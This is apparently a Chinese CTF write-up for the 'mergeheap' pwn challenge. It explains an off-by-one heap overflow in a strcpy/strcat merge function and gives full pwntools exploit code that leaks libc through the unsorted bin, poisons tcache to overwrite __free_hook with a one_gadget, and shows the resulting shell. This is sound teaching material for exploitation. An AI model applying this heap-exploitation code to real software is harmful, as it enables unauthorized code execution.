---
layout: post
title: 护网杯mergeheap writeup
categories: ctf
tags:  off-by-one pwn tcache
author: jcxp
---

## 前言
这道题考察的是堆溢出在`libc2.27`以上的利用方式,在高版本的`libc`中引入了`tcache`机制
>  tcache是libc2.26之后引进的一种新机制，类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找到对应大小的chunk.

## 漏洞分析

在`merge`这个功能中,当分配的堆块占用了下一`chunk`的`pre_size`位时，`strcpy`的时候会将下一`chunk`的`size`也复制，再配合`strcat`会溢出一个字节,`merge`部分函数代码如下

```c
int sub_E29()
{
  int v1; // ST1C_4
  signed int i; // [rsp+8h] [rbp-18h]
  signed int v3; // [rsp+Ch] [rbp-14h]
  signed int v4; // [rsp+10h] [rbp-10h]

  for ( i = 0; i <= 14 && qword_2020A0[i]; ++i )
    ;
  if ( i > 14 )
    return puts("full");
  printf("idx1:");
  v3 = sub_B8B();
  if ( v3 < 0 || v3 > 14 || !qword_2020A0[v3] )
    return puts("invalid");
  printf("idx2:");
  v4 = sub_B8B();
  if ( v4 < 0 || v4 > 14 || !qword_2020A0[v4] )
    return puts("invalid");
  v1 = dword_202060[v3] + dword_202060[v4];
  qword_2020A0[i] = malloc(v1);
  strcpy((char *)qword_2020A0[i], (const char *)qword_2020A0[v3]);
  strcat((char *)qword_2020A0[i], (const char *)qword_2020A0[v4]);
  dword_202060[i] = v1;
  return puts("Done");
}
```


## 漏洞利用


- 首先,填满`tcache`的链表,再分配一个`unsortbin`的`chunk`然后`free`,此时的`fd`和`bk`会存放`main_arena`的地址,然后`malloc`一个小`chunk`把`fd`填满,就可以泄露`main_arena`的地址了,代码如下:  

```python
add(200,200*'a')#0
add(200,200*'a')#1
add(200,200*'a')#2
add(200,200*'a')#3
add(200,200*'a')#4
add(200,200*'a')#5
add(200,200*'a')#6
add(200,200*'a')#7
add(200,200*'a')#8
add(200,200*'a')#9

for i in range(7):
	dele(i+1)#1-7

dele(8)#8

for i in range(7):
	add(200,200*'e')

add(8,'bbbbbbbb')

show(8)

p.recvuntil('bbbbbbbb')


leak=u64(p.recv(6).ljust(8,'\x00'))

log.info("leak=%s"%hex(leak))

libc_base=leak-288-0x10-libc.symbols['__malloc_hook']

log.info("libc_base=%s"%hex(libc_base))

```

此时堆栈的结构如下:

```c
pwndbg> x /10gx 0x5555557578f0-0x30
0x5555557578c0:	0x6565656565656565	0x6565656565656565
0x5555557578d0:	0x6565656565656565	0x0000000000000021  //chunk8
0x5555557578e0:	0x6262626262626262	0x00007ffff7dcfd60
0x5555557578f0:	0x6161616161616161	0x00000000000000b1
0x555555757900:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
pwndbg> 

```
可以看到`chunk8`已经可以泄露`main_arena`的地址了

- 然后把`unsortedbin`填满,之后利用`tcache`形成两个链表,修改链表的`fd`到`__free_hook`,然后,再`malloc`,就可以`getshell`  


```python 
add(0xa0,0xa0*'a')

for i in range(7):
	dele(i+1)#1-7
gdb.attach(p,"b* 0x555555554A3A\n")
add(0x68,'aa')  #1
add(0x28,'b'*0x28)  #2
add(0x40,'d'*0x3f+'\x81')  #3
add(0x60,'c') #4
#raw_input('1')

dele(1)
merge(2,3)
dele(2)
dele(3)

one_gadget = libc_base + 0x4f322
free_hook = libc_base + 0x3ed8e8
log.info("free_hook=%s"%hex(free_hook))


add(0x70,'a'*0x20+p64(0)+p64(0x51)+p64(free_hook))
add(0x40,'b')
add(0x40,p64(one_gadget))
dele(0)
p.interactive()

```

下面的结构可以看到我们成功修改到了`__free_hook`的地址

```c 
pwndbg> bins 
tcachebins
0x50 [  1]: 0x555555757b20 —▸ 0x7ffff7dd18e8 (__free_hook) ◂— ... //free_hook
0xd0 [  7]: 0x555555757330 —▸ 0x555555757400 —▸ 0x5555557574d0 —▸ 0x5555557575a0 —▸ 0x555555757670 —▸ 0x555555757740 —▸ 0x555555757810 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 

```



- `getshell`效果如下  


```c 
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x5 bytes:
    'jcxp\n'
jcxp
$  

```